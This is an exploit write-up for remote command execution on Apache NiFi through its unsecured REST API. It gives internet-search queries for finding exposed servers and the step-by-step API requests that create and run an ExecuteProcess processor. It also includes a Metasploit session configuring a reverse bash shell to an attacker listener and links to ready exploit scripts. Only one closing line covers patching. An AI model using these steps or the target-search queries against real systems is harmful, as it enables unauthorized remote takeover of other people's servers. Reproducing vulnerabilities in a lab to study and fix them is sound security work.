# Apache NiFi Processor RCE (Oct 3 2020)
Apache NiFi is a software project to automate the flow of data between software systems.  
This module uses the NiFi API to create an ExecuteProcess processor that will execute OS commands. The API must be unsecured (or credentials provided) and the ExecuteProcess processor must be available. An ExecuteProcessor processor is created then is configured with the payload and started. The processor is then stopped and deleted.

API Executing Process: https://nifi.apache.org/docs/nifi-docs/components/org.apache.nifi/nifi-standard-nar/1.12.1/org.apache.nifi.processors.standard.ExecuteProcess/  

Vulnerable architectures: **x86, x64**  
Vulnerable platforms: **Linux, OSX, Unix, Windows**  
Vulnerable protocols: **http, https**  

**Please be aware that this exploit leaves signs of a compromise in a log file (Example: SQL injection data found in HTTP log) and modifies some configuration setting on the target machine, this is not a guide on how to exploit others, this is a guide on how to reproduce the vulnerability and how to fix it.**  

Python Raw Exploit: https://raw.githubusercontent.com/imjdl/Apache-NiFi-Api-RCE/master/exp.py  

MetaSploit Exploit: https://dl.packetstormsecurity.net/2011-exploits/apache_nifi_processor_rce.rb.txt  
MetaSploit Linux Default Payload: **cmd/unix/reverse_bash**  
MetaSploit Windows Default Payload: **cmd/windows/reverse_powershell**  

Shodan Query: `title:"NiFi"`  
Fofa Query: `title=="NiFi"`  

# How does the Exploit work
## GET /nifi-api/access/config: Used to check whether the target is running NiFi and whether authentication is required.  
Example Output:
<pre>{
    "config": {
	    "supportsLogin": true
	}
}</pre>

## POST /nifi-api/access/token: Used to obtain an access token using supplied credentials (if authentication is required).  
Content-Type: **application/x-www-form-urlencoded**  
HTTP Parameters: **username, password**  
| Status code  | Description |
|---|---|
| 200	| Successful operation. |
| 400	|	NiFi was unable to complete the request because it was invalid. The request should not be retried without modification. |
| 403	|	Client is not authorized to make this request. |
| 409	|	Unable to create access token because NiFi is not in the appropriate state. (i.e. may not be configured to support username/password login. |
| 500	|	Unable to create access token because an unexpected error occurred. |  

## GET /nifi-api/process-groups/root: Used to obtain the ID of the root process group.  
Example Output:
<pre>{
    "revision": {REDACTED},
    "id": "value",
    "uri": "value",
    "position": {REDACTED},
    "permissions": {REDACTED},
    "bulletins": [{REDACTED}],
    "disconnectedNodeAcknowledged": true,
    "component": {REDACTED},
    "status": {REDACTED},
    "versionedFlowSnapshot": {REDACTED},
    "runningCount": 0,
    "stoppedCount": 0,
    "invalidCount": 0,
    "disabledCount": 0,
    "activeRemotePortCount": 0,
    "inactiveRemotePortCount": 0,
    "versionedFlowState": "value",
    "upToDateCount": 0,
    "locallyModifiedCount": 0,
    "staleCount": 0,
    "locallyModifiedAndStaleCount": 0,
    "syncFailureCount": 0,
    "localInputPortCount": 0,
    "localOutputPortCount": 0,
    "publicInputPortCount": 0,
    "publicOutputPortCount": 0,
    "parameterContext": {REDACTED},
    "inputPortCount": 0,
    "outputPortCount": 0
}</pre>
## POST /nifi-api/process-groups/\<ROOT-PROCESSOR-GROUP-ID\>/processors: Used to create an ExecuteProcess processor in the root group.  
Content Type: **application/json**
Post Data:
<pre>{
    "component": {
        "type": "org.apache.nifi.processors.standard.ExecuteProcess"
    },
    "revision": {
        "version": 0
    }
}</pre>

## PUT /nifi-api/processors/\<NEW-PROCESSOR-ID\>: Used to configure the new ExecuteProcess processor and run the OS command.
## PUT /nifi-api/processors/\<NEW-PROCESSOR-ID\>/run-status: Used to stop the new ExecuteProcess processor prior to deletion.  
## DELETE /nifi-api/processors/\<NEW-PROCESSOR-ID\>/threads: Used to terminate threads in case stopping failed.
## DELETE /nifi-api/processors/\<NEW-PROCESSOR-ID\>: Used to delete the processor.

## Using apache_nifi_processor_rce's Exploit
<pre>msf6 > use exploit/multi/http/apache_nifi_processor_rce
[*] Using configured payload cmd/unix/reverse_bash</pre>
## Local IP for Reverse Shell Connection
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set LHOST 192.168.60.7
LHOST => 192.168.60.7</pre>
## Local Port for Reverse Shell Connection
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set LPORT 4444
LPORT => 4444</pre>
## Remote IP for Exploit Execution
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set RHOST 192.168.60.57
RHOST => 192.168.60.57</pre>
## Remote Port for Exploit Execution
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set RPORT 8080
RPORT => 8080</pre>
## Checking Current Exploit Options
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > show options</pre>
![msf1](https://user-images.githubusercontent.com/94451745/149518743-e2ad0802-819a-4037-9798-8422f0c236c4.png)
## Running Exploit
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > run</pre>
![msf2](https://user-images.githubusercontent.com/94451745/149520071-97c27099-82df-493b-9ead-a5a96afcc29b.png)
## Vulnerability patching
Upgrade to the latest version, add/change current credentials and setup an IP whitelist in your current firewall settings.
